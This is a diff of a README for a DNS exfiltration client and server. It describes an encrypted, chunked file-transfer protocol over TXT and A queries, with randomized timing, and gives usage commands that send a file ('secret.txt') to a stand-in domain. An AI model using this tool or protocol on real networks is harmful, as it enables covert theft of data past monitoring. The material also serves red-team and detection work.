@@ -1,40 +1,44 @@
-# DNS Exfiltration Client & Server (v2.5)
+# DNS Exfiltration Client & Server (v3.0)
 
 This toolkit demonstrates secure, authenticated DNS-based file exfiltration using modern cryptography:
 
-- **Perfect Forward Secrecy** via ephemeral X25519 ECDH  
-- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity  
-- **Base32** payload encoding for DNS-safe transfers  
-- **Chunked UDP DNS A queries** for transport  
-- **Stateless session reassembly** on the server keyed by client UUID  
+- **True Perfect Forward Secrecy** — both sides generate ephemeral X25519 keypairs per session; no key material is ever persisted to disk
+- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity
+- **Base32** payload encoding for DNS-safe transfers
+- **Chunked UDP DNS queries** for transport
+- **Stateless session reassembly** on the server keyed by client UUID
 
 ---
 
-## 🔧 Components
+## Components
 
 ### client.py
 
-- Generates an ephemeral X25519 keypair per transfer  
-- Sends your public key in Base32 chunks (`<id>-0-0-<pubkey>`)  
-- Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF  
-- Encrypts your file with AES-GCM (12 B nonce)  
-- Appends an HMAC-SHA256 tag to the ciphertext  
-- Base32-encodes the combined blob, splits into **randomized-size** subdomains (≤ 52 chars of data) to vary label lengths  
-- Issues DNS A queries with client-configurable inter-query delays (`--delay-low`/`--delay-high`)  
-- Retries missing chunks up to `MAX_RETRIES`  
+- Generates an ephemeral X25519 keypair per transfer
+- Sends client public key as a **TXT query** (`<id>-0-0-<b32_pubkey>.<domain>`)
+- Receives the server's ephemeral public key in the **TXT response**
+- Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF
+- Encrypts file with AES-GCM (12 B nonce), appends HMAC-SHA256 tag
+- Base32-encodes the blob, splits into randomized-size subdomains (≤ 52 chars of data)
+- Sends data chunks as DNS A queries with configurable inter-query delays (`--low`/`--high`)
+- Retries failed queries up to `MAX_RETRIES`
 
 ### server.py
 
-- Listens on UDP port 53 for DNS A queries  
-- Parses `<id>-<idx>-<total>-<fragment>` subdomains  
-- On `idx=0,total=0`, reassembles client’s ephemeral public key and performs ECDH → HKDF  
-- Buffers Base32 fragments, applies padding, decodes via `base64.b32decode`  
-- Splits out the last 32 bytes as HMAC tag and verifies it, then AES-GCM decrypts  
-- Writes plaintext to `output/<id>.bin` and cleans up idle sessions  
+- Listens on a configurable UDP port for DNS queries
+- On TXT queries matching `<id>-0-0-<client_pubkey>.<domain>`:
+  - Generates an ephemeral X25519 keypair for this session
+  - Derives shared AES + HMAC keys via ECDH + HKDF
+  - Responds with its ephemeral public key as TXT rdata (TTL=0)
+  - Idempotent: retried key exchanges return the cached server pubkey
+- On A queries matching `<id>-<idx>-<total>-<chunk>.<domain>`:
+  - Buffers Base32 fragments, decodes, verifies HMAC, decrypts AES-GCM
+  - Writes plaintext to `output/<id>.bin`
+- Cleans up idle sessions periodically
 
 ---
 
-## 📥 Installation
+## Installation
 
 ```bash
 git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
@@ -44,84 +48,52 @@ source venv/bin/activate
 pip install -r requirements.txt
 ```
 
----
-
-## 🔒 Configuration
-
-Create a `.env` in the project root for the server:
-
-```ini
-SERVER_PRIVATE_KEY=./server.key
-```
-
-- `server.key` must be a raw 32 B X25519 private key (no PEM header).  
-- Generate one in Bash:
-
-  ```bash
-  python3 - << 'EOF'
-  from cryptography.hazmat.primitives.asymmetric import x25519
-  from cryptography.hazmat.primitives import serialization
-  key = x25519.X25519PrivateKey.generate()
-  raw = key.private_bytes(
-    encoding=serialization.Encoding.Raw,
-    format=serialization.PrivateFormat.Raw,
-    encryption_algorithm=serialization.NoEncryption()
-  )
-  open('server.key','wb').write(raw)
-  EOF
-  ```
+No key generation step is needed — keys are created ephemerally at runtime.
 
 ---
 
-## 🚀 Usage
+## Usage
 
 ### Start Server
 
 ```bash
 python server.py \
   --port 5300 \
-  --domain example.com \
+  --domain xf.example.com \
   --output-dir output
 ```
-
-_By default, it reads `SERVER_PRIVATE_KEY` from `.env` (override with `--server-key`)._
 
 ### Run Client
 
 ```bash
 python client.py \
-  --server-ip    127.0.0.1 \
-  --server-port  5300 \
-  --domain       example.com \
-  --server-pubkey server_public.key \
-  --file-path    secret.txt \
-  --delay-low    200 \
-  --delay-high   500
+  --server-ip   127.0.0.1 \
+  --server-port 5300 \
+  --domain      xf.example.com \
+  --file-path   secret.txt \
+  --low         500 \
+  --high        1000
 ```
 
-- `--delay-low` / `--delay-high` specify the minimum/maximum inter-query delay in **ms** (default `200–500 ms`)  
-- The client first exchanges keys (`0-0` subdomain) then sends encrypted + HMAC-tagged chunks:  
-  ```
-  <id>-<i>-<total>-<data>
-  ```
+- `--low` / `--high` specify the minimum/maximum inter-query delay in **ms** (default `500–1000 ms`)
+- The client first performs a TXT-based key exchange, then sends encrypted + HMAC-tagged data chunks as A queries
 
 ---
 
-## ⏱️ Client Throttling
+## Protocol
 
-To avoid overloading public recursive resolvers, the client inserts a randomized pause between each DNS query.  
-**Recommended defaults:** `--delay-low 200`, `--delay-high 500` (i.e. 2–5 qps). Increase to `500–1000 ms` on unstable networks or reduce to `100–200 ms` in lab environments.
+1. Client generates session ID + ephemeral X25519 keypair
+2. Client sends **TXT query** to `<id>-0-0-<b32_client_pubkey>.<domain>`
+3. Server generates ephemeral keypair, derives shared keys
+4. Server responds with **TXT record** containing its Base32-encoded ephemeral pubkey (TTL=0)
+5. Client parses TXT response, derives the same shared keys
+6. Client encrypts file (AES-GCM), appends HMAC tag, Base32-encodes
+7. Client sends data chunks as **A queries**: `<id>-<idx>-<total>-<chunk>.<domain>`
+8. Server reassembles, verifies HMAC, decrypts, writes output
 
 ---
 
-## 🔍 What HMAC Adds
-
-- **Integrity**: ensures ciphertext wasn’t altered  
-- **Authentication**: only someone with the HMAC key can produce valid tags  
-
----
-
-## ⚙️ CLI Reference
+## CLI Reference
 
 **Server**:
 
@@ -129,10 +101,7 @@ To avoid overloading public recursive resolvers, the client inserts a randomized
 usage: server.py [-h]
                  [--port PORT]
                  [--output-dir DIR]
-                 [--low LOW]
-                 [--high HIGH]
                  [--domain DOMAIN]
-                 [--server-key PATH]
 ```
 
 **Client**:
@@ -142,31 +111,30 @@ usage: client.py [-h]
                  [--server-ip IP]
                  [--server-port PORT]
                  [--domain DOMAIN]
-                 [--server-pubkey PATH]
-                 [--delay-low MS]
-                 [--delay-high MS]
+                 [--low MS]
+                 [--high MS]
                  --file-path FILE_PATH
 ```
 
 ---
 
-## 📁 Output
+## Output
 
-Decrypted files land in `--output-dir` (default `output/`). File names match the session ID.
-
----
-
-## 🛡️ Security Notes
-
-- Fresh ECDH key per transfer → **forward secrecy**  
-- AES-GCM + HMAC → **confidentiality**, **integrity**, **authentication**  
-- No persistent session state; idle sessions auto-cleaned  
+Decrypted files land in `--output-dir` (default `output/`). File names match the session ID (`<id>.bin`).
 
 ---
 
-## 📜 License & Author
+## Security Notes
 
-**Author:** John Burns  
-**Date:** 2025-05-07 
-**License:** GPL-3.0  
-```  
+- Ephemeral X25519 keypairs on **both** sides per session → **true perfect forward secrecy**
+- No key material ever touches disk — compromise of the server host reveals nothing about past sessions
+- AES-GCM + HMAC → **confidentiality**, **integrity**, **authentication**
+- Idle sessions auto-cleaned; per-IP rate limiting on the server
+
+---
+
+## License & Author
+
+**Author:** John Burns
+**Date:** 2025-05-07
+**License:** GPL-3.0
